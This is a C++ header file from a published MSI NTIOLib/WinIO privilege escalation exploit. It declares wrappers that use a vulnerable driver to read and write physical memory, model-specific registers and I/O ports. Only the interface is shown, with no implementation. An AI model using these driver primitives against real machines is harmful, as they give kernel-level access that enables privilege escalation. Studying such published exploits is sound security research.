/**
*
* MSI NTIOLib/WinIO privilege escalation exploit
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1630
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#pragma once
#include <windows.h>
#include <cstdint>
#include "IMemory.h"

class NTIOLib
{
private:
	HANDLE hDevice;

#pragma pack(push)
#pragma pack(1)
	struct rwMemStruct
	{
		uint64_t addr;
		uint32_t itemSize;	//1, 2, 4
		uint32_t itemCount;
	};
#pragma pack(pop)

public:
	NTIOLib();
	~NTIOLib();
	uint64_t readPmc(uint32_t pmc) const;
	uint64_t readMsr(uint32_t msr) const;
	bool writeMsr(uint32_t msr, uint64_t value) const;
	bool readPhysicalMemory(uint64_t physAddress, uint8_t* buffer, size_t size) const;
	bool writePhysicalMemory(uint64_t physAddress, const uint8_t* buffer, size_t size) const;
	void halt() const;
	bool in8(uint16_t port, uint8_t& outv) const;
	bool out8(uint16_t port, uint8_t inv) const;
};

class MemoryNTIOLib : public IMemory
{
private:
	NTIOLib m_ntio;
	uint8_t* m_IMemoryHelper;
	size_t m_IMemoryHelperSize;
	uint64_t m_IMemoryHelperAddr;

public:
	MemoryNTIOLib();
	uint8_t* getMemory(uint64_t physAddr, size_t size = 0x1000) override;
	void commitMemory() override;
	void reset() override;
	uint64_t getPhysicalAddress() override;
	void commitValue(size_t offsetInBuf, uint64_t value) override;
};
